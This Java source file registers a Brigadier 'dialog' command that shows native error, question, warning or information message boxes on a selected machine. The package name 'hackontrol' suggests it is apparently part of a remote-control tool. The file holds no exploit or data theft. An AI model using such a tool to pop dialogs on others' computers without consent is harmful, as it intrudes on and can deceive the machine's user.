package com.khopan.hackontrol.command;

import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;

public class DialogCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("dialog").requires(source -> source.isSelected()).then(LiteralArgumentBuilder.<CommandSource>literal("error").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, 0x1010);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, 0x1010);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("question").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, 0x1020);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, 0x1020);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("warning").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, 0x1030);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, 0x1030);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("information").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, 0x1040);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, 0x1040);
		})))));
	}

	private int message(CommandContext<CommandSource> context, int type) {
		String message = StringArgumentType.getString(context, "message");
		DialogCommand.messageBox(message, null, type);
		return 1;
	}

	private int title(CommandContext<CommandSource> context, int type) {
		String title = StringArgumentType.getString(context, "title");
		String message = StringArgumentType.getString(context, "message");
		DialogCommand.messageBox(message, title, type);
		return 1;
	}

	private static native void messageBox(String message, String title, int type);
}
